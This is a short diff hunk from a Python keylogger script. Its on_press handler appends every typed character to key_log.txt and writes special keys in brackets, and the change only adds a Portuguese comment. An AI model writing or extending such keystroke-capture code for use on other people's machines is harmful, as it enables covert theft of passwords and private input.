@@ -6,6 +6,7 @@ def on_press(key):
         with open("key_log.txt", "a") as log_file:
             log_file.write(f"{key.char}")
     except AttributeError:
+        #para caracteres especiais
         with open("key_log.txt", "a") as log_file:
             log_file.write(f"[{key}]")
 
